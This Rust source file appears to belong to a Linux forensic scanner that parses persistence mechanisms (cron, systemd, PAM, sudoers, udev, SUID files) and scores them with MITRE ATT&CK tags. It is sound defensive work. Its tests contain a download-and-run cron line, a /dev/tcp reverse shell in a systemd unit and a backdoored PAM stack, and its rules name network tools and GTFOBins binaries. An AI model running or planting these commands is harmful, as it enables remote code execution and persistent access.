//! Parsers and scoring for Linux autostart mechanisms: cron, anacron, at, systemd units, timers and
//! generators, rc.local and init.d, shell profiles, authorized_keys, sudoers, PAM, udev, XDG
//! autostart, kernel module loading, SUID/SGID files and extra UID 0 accounts.

use serde::Serialize;

use super::paths::{file_name, in_staging_dir, in_system_dir, suspicious_location};
use super::procrules::{cmdline_hits, is_shell, truncate};
use super::report::{Category, Finding, Severity};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum Kind {
    Cron,
    Anacron,
    At,
    SystemdService,
    SystemdTimer,
    SystemdGenerator,
    RcLocal,
    InitScript,
    ShellProfile,
    AuthorizedKey,
    Sudoers,
    Pam,
    PamModule,
    Udev,
    XdgAutostart,
    ModuleLoad,
    Suid,
    Account,
    Motd,
    AptHook,
}

impl Kind {
    pub fn label(self) -> &'static str {
        match self {
            Kind::Cron => "Cron job",
            Kind::Anacron => "Anacron job",
            Kind::At => "at job",
            Kind::SystemdService => "systemd unit",
            Kind::SystemdTimer => "systemd timer",
            Kind::SystemdGenerator => "systemd generator",
            Kind::RcLocal => "rc.local",
            Kind::InitScript => "SysV init script",
            Kind::ShellProfile => "Shell profile",
            Kind::AuthorizedKey => "SSH authorized key",
            Kind::Sudoers => "sudoers rule",
            Kind::Pam => "PAM configuration",
            Kind::PamModule => "PAM module",
            Kind::Udev => "udev rule",
            Kind::XdgAutostart => "XDG autostart",
            Kind::ModuleLoad => "Kernel module autoload",
            Kind::Suid => "SUID/SGID file",
            Kind::Account => "Account",
            Kind::Motd => "MOTD script",
            Kind::AptHook => "APT hook",
        }
    }

    pub fn mitre(self) -> &'static [&'static str] {
        match self {
            Kind::Cron | Kind::Anacron => &["T1053.003"],
            Kind::At => &["T1053.002"],
            Kind::SystemdService | Kind::SystemdGenerator => &["T1543.002"],
            Kind::SystemdTimer => &["T1053.006"],
            Kind::RcLocal | Kind::InitScript => &["T1037.004"],
            Kind::ShellProfile => &["T1546.004"],
            Kind::AuthorizedKey => &["T1098.004"],
            Kind::Sudoers => &["T1548.003"],
            Kind::Pam | Kind::PamModule => &["T1556.003"],
            Kind::Udev => &["T1546.017"],
            Kind::XdgAutostart => &["T1547.013"],
            Kind::ModuleLoad => &["T1547.006"],
            Kind::Suid => &["T1548.001"],
            Kind::Account => &["T1136.001"],
            Kind::Motd => &["T1037"],
            Kind::AptHook => &["T1546"],
        }
    }

    /// Present on few systems: every entry is worth listing at Info.
    fn inventory(self) -> bool {
        matches!(
            self,
            Kind::At | Kind::RcLocal | Kind::AuthorizedKey | Kind::SystemdGenerator
        )
    }

    /// Mechanisms where a file no package owns is itself unusual.
    fn ownership_matters(self) -> bool {
        matches!(
            self,
            Kind::SystemdService
                | Kind::SystemdTimer
                | Kind::SystemdGenerator
                | Kind::InitScript
                | Kind::Udev
                | Kind::XdgAutostart
                | Kind::PamModule
                | Kind::Motd
                | Kind::AptHook
                | Kind::Suid
                | Kind::ModuleLoad
        )
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct Entry {
    pub kind: Kind,
    /// File that holds the entry.
    pub location: String,
    pub name: String,
    /// What runs (command line, module path, key...).
    pub command: String,
    /// Owned by an installed package (None = no package database available).
    pub owned: Option<bool>,
    /// Modification time of `location` (seconds since the epoch).
    pub mtime: Option<u64>,
    pub user: Option<String>,
    pub notes: Vec<String>,
    /// Severity floor set by the parser (e.g. pam_exec, NOPASSWD ALL).
    pub floor: Severity,
}

impl Entry {
    pub fn new(
        kind: Kind,
        location: impl Into<String>,
        name: impl Into<String>,
        command: impl Into<String>,
    ) -> Self {
        Entry {
            kind,
            location: location.into(),
            name: name.into(),
            command: command.into(),
            owned: None,
            mtime: None,
            user: None,
            notes: Vec::new(),
            floor: Severity::Info,
        }
    }

    pub fn floor(mut self, s: Severity, note: impl Into<String>) -> Self {
        self.floor = self.floor.max(s);
        self.notes.push(note.into());
        self
    }
}

/// First absolute path in a command, looking through `sh -c`, `env` and interpreter wrappers.
pub fn command_target(cmd: &str) -> Option<String> {
    let toks: Vec<&str> = cmd
        .split_whitespace()
        .map(|t| t.trim_matches(|c| c == '"' || c == '\'' || c == ';' || c == '(' || c == ')'))
        .collect();
    let mut i = 0;
    while i < toks.len() {
        let t = toks[i];
        let base = file_name(t);
        if t.contains('=') && !t.starts_with('/')
            || matches!(
                base,
                "env"
                    | "nohup"
                    | "nice"
                    | "ionice"
                    | "setsid"
                    | "exec"
                    | "sudo"
                    | "timeout"
                    | "flock"
                    | "chronic"
                    | "run-parts"
            )
            || t.starts_with('-')
            || t.is_empty()
        {
            i += 1;
            continue;
        }
        if t.starts_with('/') || t.starts_with("./") {
            if is_shell(base)
                || base.starts_with("python")
                || base == "perl"
                || base == "ruby"
                || base == "php"
            {
                // Interpreter: the script is the real target if one is given.
                if let Some(script) = toks[i + 1..].iter().find(|x| x.starts_with('/')) {
                    return Some(script.to_string());
                }
            }
            return Some(t.to_string());
        }
        if is_shell(base) {
            i += 1;
            continue;
        }
        return None;
    }
    None
}

fn recent(mtime: Option<u64>, now: u64, days: u64) -> bool {
    mtime.is_some_and(|m| m <= now + 86_400 && now.saturating_sub(m) < days * 86_400)
}

/// Score one entry. `now` is the scan time; files changed within the last 7 days get a bump.
pub fn score(e: &Entry, now: u64) -> Option<Finding> {
    let mut sev = e.floor;
    let mut reasons: Vec<String> = e.notes.clone();
    let mut mitre: Vec<&'static str> = e.kind.mitre().to_vec();

    for h in cmdline_hits(&e.command) {
        sev = sev.max(h.severity);
        reasons.push(h.reason);
        mitre.extend_from_slice(h.mitre);
    }
    if e.kind != Kind::AuthorizedKey && e.kind != Kind::Account {
        let target = if e.kind == Kind::Suid || e.kind == Kind::PamModule {
            Some(e.command.clone())
        } else {
            command_target(&e.command)
        };
        if let Some(t) = target {
            if let Some(why) = suspicious_location(&t) {
                let s = if in_staging_dir(&t) || t.starts_with("/dev/") {
                    Severity::High
                } else {
                    Severity::Medium
                };
                sev = sev.max(s);
                reasons.push(format!("runs {t}: {why}"));
            }
        }
    }
    if e.kind.ownership_matters() && e.owned == Some(false) {
        sev = sev.max(Severity::Low);
        reasons.push("not owned by any installed package".into());
    }
    if recent(e.mtime, now, 7) && sev >= Severity::Low {
        sev = sev.bump();
        reasons.push("modified within the last 7 days".into());
    } else if recent(e.mtime, now, 7) && e.kind.inventory() {
        reasons.push("modified within the last 7 days".into());
        sev = sev.max(Severity::Low);
    }
    if sev == Severity::Info && !e.kind.inventory() {
        return None;
    }

    let mut f = Finding::new(
        sev,
        Category::Persistence,
        format!("{}: {}", e.kind.label(), e.name),
    )
    .path(e.location.clone());
    if !e.command.is_empty() {
        f = f.detail(format!("runs: {}", truncate(&e.command, 400)));
    }
    if let Some(u) = &e.user {
        f = f.detail(format!("user: {u}"));
    }
    for r in reasons {
        f = f.detail(r);
    }
    if let Some(m) = e.mtime {
        f = f.detail(format!("modified: {}", super::timefmt::iso8601(m)));
    }
    mitre.dedup();
    let mut seen = Vec::new();
    for m in mitre {
        if !seen.contains(&m) {
            seen.push(m);
        }
    }
    Some(f.mitre(&seen))
}

// ---------------------------------------------------------------- parsers

/// One crontab job: (schedule, user, command).
pub type CronJob = (String, Option<String>, String);

/// Parse a crontab. System crontabs (/etc/crontab, /etc/cron.d) carry a user column.
pub fn parse_crontab(text: &str, system: bool) -> Vec<CronJob> {
    let mut out = Vec::new();
    for line in text.lines() {
        let l = line.trim();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        // Environment assignment: NAME=value before any whitespace.
        if let Some(eq) = l.find('=') {
            if !l[..eq].contains(char::is_whitespace)
                && !l.starts_with('@')
                && !l.starts_with(|c: char| c.is_ascii_digit() || c == '*')
            {
                continue;
            }
        }
        let mut parts = l.split_whitespace();
        let (sched, nfields) = if l.starts_with('@') {
            (parts.next().unwrap_or("").to_string(), 0)
        } else {
            (String::new(), 5)
        };
        let mut sched = sched;
        for _ in 0..nfields {
            match parts.next() {
                Some(p) => {
                    if !sched.is_empty() {
                        sched.push(' ');
                    }
                    sched.push_str(p);
                }
                None => break,
            }
        }
        let user = if system {
            parts.next().map(String::from)
        } else {
            None
        };
        let cmd: Vec<&str> = parts.collect();
        if cmd.is_empty() {
            continue;
        }
        out.push((sched, user, cmd.join(" ")));
    }
    out
}

/// /etc/anacrontab: `period delay job-id command`.
pub fn parse_anacrontab(text: &str) -> Vec<(String, String)> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter(|l| !l.split_whitespace().next().unwrap_or("").contains('='))
        .filter_map(|l| {
            let p: Vec<&str> = l.split_whitespace().collect();
            (p.len() >= 4).then(|| (p[2].to_string(), p[3..].join(" ")))
        })
        .collect()
}

/// at spool files are shell scripts; the job is what follows the environment preamble.
pub fn parse_at_job(text: &str) -> String {
    // atd writes: env preamble, `cd DIR || { ... exit 1 }`, then the job (newer versions wrap it
    // in a `${SHELL:-/bin/sh} << 'marcinDELIMITER...'` heredoc).
    let lines: Vec<&str> = text.lines().collect();
    let start = lines
        .iter()
        .position(|l| l.starts_with("cd "))
        .and_then(|c| {
            lines[c..]
                .iter()
                .position(|l| l.trim() == "}")
                .map(|e| c + e + 1)
        });
    if let Some(s) = start {
        return lines[s..]
            .iter()
            .map(|l| l.trim())
            .filter(|l| {
                !l.is_empty()
                    && !l.starts_with('#')
                    && !l.starts_with("${SHELL")
                    && !l.starts_with("marcinDELIMITER")
            })
            .collect::<Vec<_>>()
            .join("; ");
    }
    {
        text.lines()
            .filter(|l| !l.starts_with('#') && !l.contains('=') && !l.trim().is_empty())
            .collect::<Vec<_>>()
            .join("; ")
    }
}

/// Commands from a systemd unit: Exec* lines, plus the timer's Unit= and calendar.
pub fn parse_unit(text: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut cont = String::new();
    for raw in text.lines() {
        let line = raw.trim_end();
        if let Some(stripped) = line.strip_suffix('\\') {
            cont.push_str(stripped);
            cont.push(' ');
            continue;
        }
        let full = format!("{cont}{line}");
        cont.clear();
        let l = full.trim();
        if l.starts_with('#') || l.starts_with(';') {
            continue;
        }
        if let Some((k, v)) = l.split_once('=') {
            let k = k.trim();
            if k.starts_with("Exec")
                || matches!(
                    k,
                    "Unit"
                        | "OnCalendar"
                        | "OnBootSec"
                        | "OnUnitActiveSec"
                        | "Environment"
                        | "EnvironmentFile"
                )
            {
                let v = v
                    .trim()
                    .trim_start_matches(['@', '-', '+', '!', ':', '|'])
                    .to_string();
                if !v.is_empty() {
                    out.push((k.to_string(), v));
                }
            }
        }
    }
    out
}

/// Program invocations from a udev rule file (RUN, PROGRAM, IMPORT{program}).
pub fn parse_udev(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for l in text.lines().map(str::trim).filter(|l| !l.starts_with('#')) {
        for part in split_udev_keys(l) {
            let (k, v) = match part.split_once('=') {
                Some(x) => x,
                None => continue,
            };
            let k = k.trim_end_matches(['+', ':', '!']).trim();
            let v = v.trim().trim_start_matches('=').trim().trim_matches('"');
            let prog =
                k == "RUN" || k == "RUN{program}" || k == "PROGRAM" || k == "IMPORT{program}";
            if prog && !v.is_empty() && !v.starts_with("builtin") && k != "RUN{builtin}" {
                out.push(v.to_string());
            }
        }
    }
    out
}

/// Split a udev rule on commas that are outside double quotes.
fn split_udev_keys(l: &str) -> Vec<&str> {
    let mut v = Vec::new();
    let (mut start, mut q) = (0, false);
    for (i, c) in l.char_indices() {
        match c {
            '"' => q = !q,
            ',' if !q => {
                v.push(l[start..i].trim());
                start = i + 1;
            }
            _ => {}
        }
    }
    v.push(l[start..].trim());
    v
}

/// Exec= of a .desktop file, unless the entry is Hidden=true.
pub fn parse_desktop(text: &str) -> Option<String> {
    let mut exec = None;
    let mut in_entry = false;
    for l in text.lines().map(str::trim) {
        if l.starts_with('[') {
            in_entry = l == "[Desktop Entry]";
            continue;
        }
        if !in_entry {
            continue;
        }
        if l.eq_ignore_ascii_case("Hidden=true") {
            return None;
        }
        if let Some(v) = l.strip_prefix("Exec=") {
            exec = Some(v.trim().to_string());
        }
    }
    exec
}

const ADMIN_PRINCIPALS: &[&str] = &["root", "%sudo", "%wheel", "%admin", "%root", "ALL"];

/// Interesting sudoers lines: NOPASSWD, !authenticate, or full root granted to a non-admin principal.
pub fn sudoers_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    for l in text.lines().map(str::trim) {
        if l.is_empty()
            || l.starts_with('#') && !l.starts_with("#include")
            || l.starts_with("Defaults")
        {
            continue;
        }
        if l.starts_with("#include") || l.starts_with("@include") {
            continue;
        }
        if l.starts_with("User_Alias")
            || l.starts_with("Cmnd_Alias")
            || l.starts_with("Host_Alias")
            || l.starts_with("Runas_Alias")
        {
            continue;
        }
        let principal = l.split_whitespace().next().unwrap_or("");
        let nopasswd = l.contains("NOPASSWD");
        let noauth = l.contains("!authenticate");
        let all_cmds = l.trim_end().ends_with("ALL")
            || l.contains(") ALL")
            || l.contains(":ALL")
            || l.contains(": ALL");
        let admin = ADMIN_PRINCIPALS.contains(&principal);
        let mut e = Entry::new(Kind::Sudoers, path, principal, l);
        if (nopasswd || noauth) && all_cmds {
            e = e.floor(
                if admin {
                    Severity::Low
                } else {
                    Severity::Medium
                },
                "passwordless root for every command",
            );
        } else if nopasswd || noauth {
            e = e.floor(Severity::Info, "passwordless rule for specific commands");
        } else if all_cmds && !admin {
            e = e.floor(Severity::Low, "full sudo rights for a non-admin principal");
        } else {
            continue;
        }
        let cmd_bins = l.rsplit(':').next().unwrap_or("");
        if [
            "/bin/sh",
            "/bin/bash",
            "/usr/bin/vim",
            "/usr/bin/find",
            "/usr/bin/python",
            "/usr/bin/perl",
            "/usr/bin/less",
            "/usr/bin/awk",
            "/usr/bin/env",
        ]
        .iter()
        .any(|b| cmd_bins.contains(b))
        {
            e = e.floor(
                Severity::Medium,
                "allowed command can spawn a shell (GTFOBins)",
            );
        }
        out.push(e);
    }
    out
}

pub const PAM_DIRS: &[&str] = &[
    "/lib/security/",
    "/lib64/security/",
    "/usr/lib/security/",
    "/usr/lib64/security/",
    "/lib/x86_64-linux-gnu/security/",
    "/usr/lib/x86_64-linux-gnu/security/",
    "/lib/aarch64-linux-gnu/security/",
    "/usr/lib/aarch64-linux-gnu/security/",
    "/usr/lib/i386-linux-gnu/security/",
    "/lib/i386-linux-gnu/security/",
];

/// PAM lines that load modules from odd places or run programs.
pub fn pam_entries(path: &str, text: &str, module_exists: &dyn Fn(&str) -> bool) -> Vec<Entry> {
    let mut out = Vec::new();
    for l in text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
    {
        let toks: Vec<&str> = l.split_whitespace().collect();
        if toks.len() < 3 || toks[0].starts_with('@') {
            continue;
        }
        // Control may be a bracketed list: [success=1 default=ignore]
        let mut i = 1;
        if toks[1].starts_with('[') {
            while i < toks.len() && !toks[i].ends_with(']') {
                i += 1;
            }
        }
        // include/substack name another PAM config, not a module.
        if matches!(toks[i].trim_matches(['[', ']']), "include" | "substack") {
            continue;
        }
        let Some(module) = toks.get(i + 1) else {
            continue;
        };
        let optional_load = toks[0].starts_with('-');
        let args = toks.get(i + 2..).map(|a| a.join(" ")).unwrap_or_default();
        let mname = file_name(module);
        let mut e = Entry::new(
            Kind::Pam,
            path,
            format!("{} {}", toks[0].trim_start_matches('-'), mname),
            format!("{module} {args}").trim().to_string(),
        );
        if module.starts_with('/') && !PAM_DIRS.iter().any(|d| module.starts_with(d)) {
            e = e.floor(
                Severity::Critical,
                "PAM module loaded from outside the system security directories",
            );
        } else if !module.starts_with('/') && !optional_load && !module_exists(mname) {
            e = e.floor(
                Severity::Low,
                "referenced PAM module not found (stale config, or a module hidden by a rootkit)",
            );
        }
        if mname == "pam_exec.so" {
            e = e.floor(
                Severity::Medium,
                "pam_exec runs a program on every authentication (credential capture)",
            );
        }
        if mname == "pam_permit.so"
            && (toks[0].trim_start_matches('-') == "auth")
            && (l.contains("sufficient") || l.contains("success="))
        {
            e = e.floor(
                Severity::High,
                "pam_permit as a sufficient auth module accepts any password",
            );
        }
        if e.floor > Severity::Info {
            out.push(e);
        }
    }
    out
}

/// One authorized_keys line: (options, key type, comment).
pub fn parse_authorized_keys(text: &str) -> Vec<(String, String, String)> {
    const TYPES: &[&str] = &[
        "ssh-rsa",
        "ssh-dss",
        "ssh-ed25519",
        "ecdsa-sha2-nistp256",
        "ecdsa-sha2-nistp384",
        "ecdsa-sha2-nistp521",
        "sk-ssh-ed25519@openssh.com",
        "sk-ecdsa-sha2-nistp256@openssh.com",
        "ssh-ed448",
    ];
    let mut out = Vec::new();
    for l in text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
    {
        // Options may contain quoted spaces; find the key type token.
        let mut q = false;
        let mut split_at = None;
        for (i, c) in l.char_indices() {
            if c == '"' {
                q = !q;
            }
            if !q
                && (i == 0 || l.as_bytes()[i - 1] == b' ' || l.as_bytes()[i - 1] == b'\t')
                && TYPES
                    .iter()
                    .any(|t| l[i..].starts_with(t) && l[i + t.len()..].starts_with([' ', '\t']))
            {
                split_at = Some(i);
                break;
            }
        }
        let Some(at) = split_at else { continue };
        let opts = l[..at].trim().to_string();
        let mut rest = l[at..].split_whitespace();
        let ty = rest.next().unwrap_or("").to_string();
        let _blob = rest.next();
        let comment = rest.collect::<Vec<_>>().join(" ");
        out.push((opts, ty, comment));
    }
    out
}

pub fn authorized_key_entries(path: &str, user: &str, text: &str) -> Vec<Entry> {
    parse_authorized_keys(text)
        .into_iter()
        .map(|(opts, ty, comment)| {
            let name = if comment.is_empty() {
                format!("{ty} key for {user}")
            } else {
                format!("{ty} '{comment}' for {user}")
            };
            let mut e = Entry::new(Kind::AuthorizedKey, path, name, opts.clone());
            e.user = Some(user.to_string());
            if user == "root" {
                e = e.floor(Severity::Info, "key grants direct root login");
            }
            if opts.contains("command=") {
                e.notes.push(
                    "forced command (check it is an intended restriction, not a backdoor)".into(),
                );
            }
            if ty == "ssh-dss" {
                e = e.floor(Severity::Low, "legacy DSA key");
            }
            e
        })
        .collect()
}

/// Shell profile lines that change behaviour in attacker-typical ways.
pub fn profile_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    for (n, l) in text.lines().enumerate() {
        let t = l.trim();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let lower = t.to_ascii_lowercase();
        let mut e = Entry::new(Kind::ShellProfile, path, format!("line {}", n + 1), t);
        if lower.starts_with("alias sudo=")
            || lower.starts_with("alias su=")
            || lower.starts_with("alias ssh=")
            || lower.starts_with("alias passwd=")
        {
            e = e.floor(
                Severity::High,
                "alias over an authentication command (credential capture)",
            );
        }
        if lower.contains("prompt_command=")
            && (lower.contains("curl")
                || lower.contains("wget")
                || lower.contains("/dev/tcp")
                || lower.contains(" nc "))
        {
            e = e.floor(Severity::High, "PROMPT_COMMAND runs a network command");
        }
        if lower.contains("trap ")
            && lower.contains("debug")
            && (lower.contains("curl") || lower.contains("logger") || lower.contains(">>"))
        {
            e = e.floor(Severity::Medium, "DEBUG trap records or ships commands");
        }
        if lower.contains("ld_preload=") {
            e = e.floor(Severity::High, "exports LD_PRELOAD");
        }
        if e.floor > Severity::Info || !cmdline_hits(t).is_empty() {
            out.push(e);
        }
    }
    out
}

/// modprobe.d `install` overrides that run commands, and module names from modules-load.d.
pub fn modprobe_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    for l in text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
    {
        let toks: Vec<&str> = l.split_whitespace().collect();
        if toks.len() >= 3 && (toks[0] == "install" || toks[0] == "remove") {
            let cmd = toks[2..].join(" ");
            let benign = matches!(file_name(toks[2]), "true" | "false")
                || cmd.starts_with("/sbin/modprobe")
                || cmd.starts_with("/usr/sbin/modprobe")
                || cmd.starts_with("/bin/false")
                || cmd.starts_with("/bin/true")
                || cmd.starts_with("/usr/bin/true")
                || cmd.starts_with("/usr/bin/false");
            if !benign {
                out.push(
                    Entry::new(
                        Kind::ModuleLoad,
                        path,
                        format!("{} {}", toks[0], toks[1]),
                        cmd,
                    )
                    .floor(
                        Severity::Medium,
                        "modprobe runs a command when the module is requested",
                    ),
                );
            }
        }
    }
    out
}

/// UID 0 accounts other than root in /etc/passwd.
pub fn passwd_entries(path: &str, text: &str) -> Vec<Entry> {
    text.lines()
        .filter_map(|l| {
            let f: Vec<&str> = l.split(':').collect();
            (f.len() >= 7 && f[2] == "0" && f[0] != "root").then(|| {
                Entry::new(Kind::Account, path, f[0], l).floor(
                    Severity::High,
                    "second account with UID 0 (root equivalent)",
                )
            })
        })
        .collect()
}

/// apt.conf.d hooks that run commands around package operations.
pub fn apt_hook_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    for l in text.lines().map(str::trim) {
        let lower = l.to_ascii_lowercase();
        if (lower.contains("pre-invoke")
            || lower.contains("post-invoke")
            || lower.contains("pre-install-pkgs"))
            && l.contains('"')
        {
            let cmd = l.split('"').nth(1).unwrap_or("").to_string();
            out.push(Entry::new(Kind::AptHook, path, "invoke hook", cmd));
        }
    }
    out
}

/// Programs that turn a SUID bit into a root shell (GTFOBins).
const GTFO_SUID: &[&str] = &[
    "bash", "sh", "dash", "zsh", "ksh", "python", "python3", "perl", "ruby", "php", "find", "vim",
    "vi", "nano", "less", "more", "awk", "gawk", "nmap", "cp", "env", "tar", "zip", "socat", "nc",
    "busybox", "node", "lua", "tclsh", "expect", "gdb", "strace",
];

pub fn suid_entry(
    path: &str,
    mode: u32,
    owned: Option<bool>,
    mtime: Option<u64>,
    ctime: Option<u64>,
    now: u64,
) -> Option<Entry> {
    let mut e = Entry::new(Kind::Suid, path, file_name(path), path);
    e.owned = owned;
    e.mtime = Some(mtime.unwrap_or(0).max(ctime.unwrap_or(0))).filter(|&t| t > 0);
    let kind = match (mode & 0o4000 != 0, mode & 0o2000 != 0) {
        (true, true) => "setuid+setgid",
        (true, false) => "setuid",
        (false, true) => "setgid",
        _ => return None,
    };
    e.notes.push(format!("{kind}, mode {:o}", mode & 0o7777));
    let base = file_name(path).trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if mode & 0o4000 != 0 && GTFO_SUID.contains(&base) {
        e = e.floor(
            Severity::High,
            "setuid copy of a program that spawns shells (GTFOBins root backdoor)",
        );
    }
    if mode & 0o002 != 0 {
        e = e.floor(Severity::High, "world-writable SUID/SGID file");
    }
    if !in_system_dir(path) && mode & 0o4000 != 0 {
        e = e.floor(Severity::Low, "setuid binary outside system directories");
    }
    if owned == Some(false) && recent(e.mtime, now, 30) {
        e = e.floor(
            Severity::Medium,
            "unpackaged SUID/SGID file changed within the last 30 days",
        );
    }
    Some(e)
}

#[cfg(test)]
mod tests {
    use super::*;

    const NOW: u64 = 1_760_000_000;

    #[test]
    fn crontab_parsing() {
        let t = "SHELL=/bin/sh\nPATH=/usr/bin\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n@reboot root /tmp/.x/run\n*/5 * * * * curl -s http://1.2.3.4/a.sh | sh\n";
        let sys = parse_crontab(t, true);
        assert_eq!(sys.len(), 3);
        assert_eq!(sys[0].0, "17 * * * *");
        assert_eq!(sys[0].1.as_deref(), Some("root"));
        assert_eq!(sys[1].0, "@reboot");
        assert_eq!(sys[1].2, "/tmp/.x/run");
        let user = parse_crontab("*/5 * * * * curl -s http://1.2.3.4/a.sh | sh\n", false);
        assert_eq!(user[0].2, "curl -s http://1.2.3.4/a.sh | sh");
        assert!(user[0].1.is_none());
    }

    #[test]
    fn cron_scoring() {
        let mut e = Entry::new(
            Kind::Cron,
            "/var/spool/cron/crontabs/root",
            "*/5 * * * *",
            "curl -s http://1.2.3.4/a.sh | sh",
        );
        assert_eq!(score(&e, NOW).unwrap().severity, Severity::High);
        e.mtime = Some(NOW - 3600);
        assert_eq!(
            score(&e, NOW).unwrap().severity,
            Severity::Critical,
            "recent change bumps"
        );
        let tmp = Entry::new(Kind::Cron, "/etc/crontab", "@reboot", "/tmp/.x/run");
        let f = score(&tmp, NOW).unwrap();
        assert_eq!(f.severity, Severity::High);
        assert!(f.mitre.contains(&"T1053.003"));
        let benign = Entry::new(
            Kind::Cron,
            "/etc/crontab",
            "17 * * * *",
            "cd / && run-parts --report /etc/cron.hourly",
        );
        assert!(score(&benign, NOW).is_none());
    }

    #[test]
    fn anacron_and_at() {
        let a = parse_anacrontab(
            "SHELL=/bin/sh\n1\t5\tcron.daily\trun-parts --report /etc/cron.daily\n",
        );
        assert_eq!(
            a,
            vec![(
                "cron.daily".to_string(),
                "run-parts --report /etc/cron.daily".to_string()
            )]
        );
        let job = "#!/bin/sh\n# atrun uid=0 gid=0\numask 22\nPATH=/usr/bin; export PATH\ncd /root || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n/tmp/payload --daemon\n";
        assert_eq!(parse_at_job(job), "/tmp/payload --daemon");
        let heredoc = "#!/bin/sh\ncd /tmp || {\n exit 1\n}\n${SHELL:-/bin/sh} << 'marcinDELIMITER5f1c'\ncurl x | sh\nmarcinDELIMITER5f1c\n";
        assert_eq!(parse_at_job(heredoc), "curl x | sh");
    }

    #[test]
    fn unit_parsing() {
        let u = "[Unit]\nDescription=x\n[Service]\nExecStartPre=-/bin/mkdir -p /run/x\nExecStart=/bin/bash -c \\\n  'bash -i >& /dev/tcp/1.2.3.4/53 0>&1'\n# ExecStart=/bin/false\n[Install]\nWantedBy=multi-user.target\n";
        let p = parse_unit(u);
        assert_eq!(p.len(), 2);
        assert_eq!(p[0], ("ExecStartPre".into(), "/bin/mkdir -p /run/x".into()));
        assert!(p[1].1.contains("/dev/tcp/"));
        let t = parse_unit("[Timer]\nOnCalendar=*:0/10\nUnit=upd.service\n");
        assert_eq!(t.len(), 2);
    }

    #[test]
    fn unit_ownership_and_target() {
        let mut e = Entry::new(
            Kind::SystemdService,
            "/etc/systemd/system/dbus-org.service",
            "dbus-org.service",
            "/usr/lib/.sys/dbusd --start",
        );
        e.owned = Some(false);
        let f = score(&e, NOW).unwrap();
        assert_eq!(
            f.severity,
            Severity::Medium,
            "hidden dir under /usr/lib + unowned"
        );
        e.command = "/usr/sbin/myd".into();
        assert_eq!(score(&e, NOW).unwrap().severity, Severity::Low);
        e.owned = Some(true);
        assert!(score(&e, NOW).is_none());
    }

    #[test]
    fn targets() {
        assert_eq!(
            command_target("/bin/sh -c /tmp/x.sh").as_deref(),
            Some("/tmp/x.sh")
        );
        assert_eq!(
            command_target("env A=1 nohup /opt/a/b --x").as_deref(),
            Some("/opt/a/b")
        );
        assert_eq!(command_target("python3 /dev/shm/a.py").as_deref(), None);
        assert_eq!(
            command_target("/usr/bin/python3 /dev/shm/a.py").as_deref(),
            Some("/dev/shm/a.py")
        );
        assert_eq!(
            command_target("bash -c '/var/tmp/.k'").as_deref(),
            Some("/var/tmp/.k")
        );
    }

    #[test]
    fn udev_parsing() {
        let r = "# c\nACTION==\"add\", SUBSYSTEM==\"net\", RUN+=\"/bin/sh -c 'echo a, b'\"\nKERNEL==\"x\", PROGRAM=\"/usr/bin/foo\", RUN{builtin}+=\"kmod load\"\nACTION==\"add\", IMPORT{program}=\"/tmp/.u\"\n";
        let v = parse_udev(r);
        assert_eq!(v, vec!["/bin/sh -c 'echo a, b'", "/usr/bin/foo", "/tmp/.u"]);
        let e = Entry::new(
            Kind::Udev,
            "/etc/udev/rules.d/99-x.rules",
            "99-x.rules",
            "/tmp/.u",
        );
        assert_eq!(score(&e, NOW).unwrap().severity, Severity::High);
    }

    #[test]
    fn desktop() {
        assert_eq!(
            parse_desktop("[Desktop Entry]\nName=x\nExec=/home/u/.x/upd\n").as_deref(),
            Some("/home/u/.x/upd")
        );
        assert_eq!(
            parse_desktop("[Desktop Entry]\nExec=a\nHidden=true\n"),
            None
        );
        assert_eq!(parse_desktop("[Desktop Action new]\nExec=a\n"), None);
    }

    #[test]
    fn sudoers() {
        let t = "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\nbackup ALL=(root) NOPASSWD: /usr/bin/rsync\nwww-data ALL=(ALL) NOPASSWD: ALL\ndev ALL=(ALL) /usr/bin/vim\nbob ALL=(ALL) ALL\n";
        let v = sudoers_entries("/etc/sudoers", t);
        let names: Vec<_> = v.iter().map(|e| (e.name.as_str(), e.floor)).collect();
        assert!(names.contains(&("www-data", Severity::Medium)));
        assert!(names.contains(&("backup", Severity::Info)));
        assert!(names.contains(&("bob", Severity::Low)));
        assert!(!names.iter().any(|n| n.0 == "root" || n.0 == "%sudo"));
        assert!(
            !names.iter().any(|n| n.0 == "dev"),
            "specific command without NOPASSWD is not reported"
        );
    }

    #[test]
    fn pam() {
        let t = "auth [success=1 default=ignore] pam_unix.so nullok\nauth required /tmp/pam_x.so\nauth optional pam_exec.so quiet expose_authtok /usr/local/bin/log.sh\nsession required pam_ghost.so\n-session optional pam_gone.so\nauth sufficient pam_permit.so\n@include common-auth\nauth include su\naccount substack system-auth\n";
        let v = pam_entries("/etc/pam.d/sshd", t, &|m| {
            m != "pam_ghost.so" && m != "pam_gone.so"
        });
        let f: Vec<_> = v.iter().map(|e| (e.name.as_str(), e.floor)).collect();
        assert!(f.contains(&("auth pam_x.so", Severity::Critical)));
        assert!(f.contains(&("auth pam_exec.so", Severity::Medium)));
        assert!(f.contains(&("session pam_ghost.so", Severity::Low)));
        assert!(f.contains(&("auth pam_permit.so", Severity::High)));
        assert_eq!(f.len(), 4, "{f:?}");
    }

    #[test]
    fn authorized_keys() {
